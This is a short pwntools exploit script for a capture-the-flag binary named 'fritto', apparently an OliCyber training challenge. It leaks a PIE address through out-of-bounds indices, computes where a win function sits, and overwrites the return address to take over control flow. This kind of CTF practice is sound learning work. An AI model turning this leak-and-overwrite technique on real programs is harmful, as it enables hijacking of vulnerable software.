from pwn import *
valid = False
while not valid:
    elf = context.binary = ELF('./fritto')
    context.terminal = ()
    if args.REMOTE:
        p = remote('fritto-disordinato.challs.olicyber.it', 33001)
    elif args.GDB:
        p = gdb.debug(elf.path, gdbscript='''
            b main
            c
        ''')
    else:
        p = elf.process()

    p.sendlineafter(b'> ',b'1')
    p.recvline()
    p.sendline(b'38')
    p.recvuntil(b': ')
    low_main = hex(int(p.recvline().strip()))
    if int(low_main,16) <0:
        valid = False
        p.close()
        continue
    p.sendlineafter(b'> ',b'1')
    p.recvline()
    p.sendline(b'39')
    p.recvuntil(b': ')
    high_main = hex(int(p.recvline().strip()))
    main_addr_hex = high_main[2:] + low_main[2:]
    main_addr = int(main_addr_hex,16)
    
    elf.address = main_addr - elf.symbols['main']
    win_addr = hex(elf.sym.win)
    win_high = win_addr[2:6]
    win_low = win_addr[6:]
    
    p.sendlineafter(b'> ',b'0')
    p.recvline()
    p.sendline(b'34')
    p.recvline()
    p.sendline(str(int(str(win_low),16)).encode())
    p.sendlineafter(b'> ',b'0')
    p.recvline()
    p.sendline(b'35')
    p.recvline()
    p.sendline(str(int(str(win_high),16)).encode())
    p.sendlineafter(b'> ',b'7')
    valid = True
    p.interactive()
# leak pie offsett 38/39

# overwrite ret addr 34/35
